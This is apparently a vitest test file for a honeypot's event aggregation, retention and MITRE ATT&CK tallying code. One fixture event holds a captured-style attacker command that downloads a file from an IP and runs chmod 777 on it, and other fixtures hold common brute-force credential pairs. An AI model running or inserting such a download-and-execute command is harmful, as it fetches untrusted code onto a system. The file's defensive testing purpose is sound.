import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { SqlClient } from "../src/sql.js";
import { EventRepository } from "../src/repository.js";
import { freshRepo } from "./helpers/pglite.js";
import { aggregate, enforceRetention } from "../src/aggregate.js";
import type { StoredEvent } from "../src/schema.js";

const NOW = Date.parse("2026-06-01T12:00:00Z");
const HOUR = 3_600_000;

let sql: SqlClient;
let repo: EventRepository;
let counter = 0;

function event(overrides: Partial<StoredEvent>): StoredEvent {
  return {
    id: `00000000-0000-4000-8000-${String(++counter).padStart(12, "0")}`,
    sensor: "hp-1",
    ts: NOW - HOUR,
    type: "login_attempt",
    src_ip_hash: "aabbccdd00112233",
    src_ip_trunc: "203.0.113.0/24",
    country: "CN",
    asn: 4134,
    asn_org: "CHINANET",
    session: "s1",
    protocol: "ssh",
    username: "root",
    password: "123456",
    success: 0,
    command: null,
    url: null,
    client_version: null,
    duration: null,
    ...overrides,
  };
}

beforeEach(async () => {
  ({ sql, repo } = await freshRepo());
  counter = 0;
});

afterEach(async () => {
  await sql.close();
});

async function totals(): Promise<Record<string, string>> {
  const rows = await repo.rows<{ key: string; value: string }>("SELECT key, value FROM rollup_totals");
  return Object.fromEntries(rows.map((r) => [r.key, r.value]));
}

describe("aggregate", () => {
  it("computes totals, 24h window, and unique sources", async () => {
    await repo.insertEvents([
      event({}),
      event({ src_ip_hash: "ffff000011112222", country: "US" }),
      event({ ts: NOW - 30 * 24 * HOUR }), // old attempt, outside 24h
      event({ type: "session_connect", username: null, password: null }),
    ]);
    await aggregate(repo, NOW);
    const t = await totals();
    expect(t.total_events).toBe("4");
    expect(t.total_login_attempts).toBe("3");
    expect(t.login_attempts_24h).toBe("2");
    expect(t.unique_sources).toBe("2");
    expect(t.sessions).toBe("1");
  });

  it("compares IPv4 and IPv6 login attempts over the last 24 hours", async () => {
    await repo.insertEvents([
      event({ src_ip_trunc: "203.0.113.0/24" }),
      event({ src_ip_trunc: "2001:0db8:0000::/48", src_ip_hash: "1111111111111111" }),
      event({ src_ip_trunc: "2001:0db8:0001::/48", src_ip_hash: "2222222222222222" }),
      event({ src_ip_trunc: "2001:0db8:0002::/48", src_ip_hash: "3333333333333333", ts: NOW - 30 * HOUR }),
      event({ type: "session_connect", username: null, password: null }),
    ]);

    await aggregate(repo, NOW);
    const t = await totals();
    expect(t.ipv4_login_attempts_24h).toBe("1");
    expect(t.ipv6_login_attempts_24h).toBe("2");
  });

  it("computes first-attack delay from sensor_live_ts", async () => {
    await repo.setMeta("sensor_live_ts", String(NOW - HOUR - 660_000)); // live 11 min before first event
    await repo.insertEvents([event({})]);
    await aggregate(repo, NOW);
    expect((await totals()).first_attack_delay_s).toBe("660");
  });

  it("ranks credential pairs", async () => {
    await repo.insertEvents([
      event({ username: "admin", password: "admin" }),
      event({ username: "admin", password: "admin" }),
      event({ username: "root", password: "toor" }),
    ]);
    await aggregate(repo, NOW);
    const creds = await repo.rows<{ username: string; password: string; count: number }>(
      "SELECT username, password, count::int AS count FROM rollup_credentials ORDER BY count DESC",
    );
    expect(creds[0]).toEqual({ username: "admin", password: "admin", count: 2 });
    expect(creds).toHaveLength(2);
  });

  it("buckets the time series hourly and daily", async () => {
    await repo.insertEvents([
      event({ ts: NOW - 2 * HOUR }),
      event({ ts: NOW - 2 * HOUR + 60_000 }),
      event({ ts: NOW - 26 * HOUR }), // inside the 48h window, previous day
    ]);
    await aggregate(repo, NOW);
    const hourly = await repo.rows<{ bucket_start: number; count: number }>(
      `SELECT bucket_start::float8 AS bucket_start, count::int AS count
       FROM rollup_timeseries WHERE granularity = 'hour' ORDER BY bucket_start`,
    );
    expect(hourly.reduce((s, r) => s + r.count, 0)).toBe(3);
    const twoAgo = hourly.find((r) => r.bucket_start === Math.floor((NOW - 2 * HOUR) / HOUR) * HOUR);
    expect(twoAgo?.count).toBe(2);
    const daily = await repo.rows<{ count: number }>(
      "SELECT count::int AS count FROM rollup_timeseries WHERE granularity = 'day'",
    );
    expect(daily.reduce((s, r) => s + r.count, 0)).toBe(3);
  });

  it("aggregates countries with unknown as '??' and tallies ATT&CK techniques", async () => {
    await repo.insertEvents([
      event({}),
      event({ country: null, src_ip_hash: "1111111111111111" }),
      event({
        type: "command",
        command: "wget http://198.51.100.23/x; chmod 777 x",
        username: null,
        password: null,
      }),
      event({ type: "session_connect", protocol: "telnet", username: null, password: null }),
    ]);
    await aggregate(repo, NOW);

    const countryRows = await repo.rows<{ country: string; count: number }>(
      "SELECT country, count::int AS count FROM rollup_countries",
    );
    const countries = Object.fromEntries(countryRows.map((r) => [r.country, r.count]));
    expect(countries["CN"]).toBe(1);
    expect(countries["??"]).toBe(1);

    const attckRows = await repo.rows<{ technique_id: string; count: number }>(
      "SELECT technique_id, count::int AS count FROM rollup_attck",
    );
    const attck = Object.fromEntries(attckRows.map((r) => [r.technique_id, r.count]));
    expect(attck["T1110.001"]).toBe(2); // two login attempts
    expect(attck["T1059.004"]).toBe(1); // one shell command
    expect(attck["T1105"]).toBe(1); // wget
    expect(attck["T1222.002"]).toBe(1); // chmod 777
    expect(attck["T1021"]).toBe(1); // telnet connect
  });

  it("is idempotent — a second pass neither re-folds nor appends", async () => {
    await repo.insertEvents([event({})]);
    await aggregate(repo, NOW);
    await aggregate(repo, NOW);
    expect((await totals()).total_login_attempts).toBe("1");
    expect(await repo.rows("SELECT * FROM rollup_credentials")).toHaveLength(1);
  });
});

describe("enforceRetention", () => {
  it("deletes only folded events past the window", async () => {
    await repo.insertEvents([event({ ts: NOW - 40 * 24 * HOUR }), event({ ts: NOW - 5 * 24 * HOUR })]);
    await aggregate(repo, NOW); // fold both so they are eligible for purge
    expect(await enforceRetention(repo, 30, NOW)).toBe(1);
    expect(await repo.countEvents()).toBe(1);
  });

  it("never deletes an event that has not been folded yet", async () => {
    // No aggregate() call → nothing folded → the lifetime contribution is not
    // yet banked, so retention must not remove it.
    await repo.insertEvents([event({ ts: NOW - 40 * 24 * HOUR })]);
    expect(await enforceRetention(repo, 30, NOW)).toBe(0);
    expect(await repo.countEvents()).toBe(1);
  });
});

describe("lifetime aggregates survive retention", () => {
  it("keeps totals, unique sources, leaderboards, and the delay stat after a purge", async () => {
    await repo.recordSensorLive(NOW - 40 * 24 * HOUR - 660_000); // live 11 min before first event
    await repo.insertEvents([
      event({ ts: NOW - 40 * 24 * HOUR }),
      event({
        ts: NOW - 40 * 24 * HOUR,
        username: "admin",
        password: "admin",
        src_ip_hash: "ffff000011112222",
      }),
    ]);
    await aggregate(repo, NOW);
    await enforceRetention(repo, 30, NOW); // both events are 40d old → purged
    await aggregate(repo, NOW); // recompute after purge

    expect(await repo.countEvents()).toBe(0); // raw events gone
    const t = await totals();
    expect(t.total_login_attempts).toBe("2"); // lifetime total survives
    expect(t.unique_sources).toBe("2"); // distinct-source set survives
    expect(t.first_attack_delay_s).toBe("660"); // anchored to persisted first event
    const creds = await repo.rows("SELECT username, password FROM rollup_credentials");
    expect(creds).toHaveLength(2); // leaderboard survives the purge
  });

  it("accumulates new events on top of purged history without double-counting", async () => {
    await repo.insertEvents([event({ ts: NOW - 40 * 24 * HOUR })], NOW - 40 * 24 * HOUR);
    await aggregate(repo, NOW);
    await enforceRetention(repo, 30, NOW);
    await aggregate(repo, NOW); // folding again must not re-count the purged event

    await repo.insertEvents([event({ ts: NOW - HOUR, src_ip_hash: "1111111111111111" })], NOW);
    await aggregate(repo, NOW);

    const t = await totals();
    expect(t.total_login_attempts).toBe("2"); // 1 purged + 1 new
    expect(t.unique_sources).toBe("2");
    expect(t.login_attempts_24h).toBe("1"); // only the new one is within 24h
  });
});
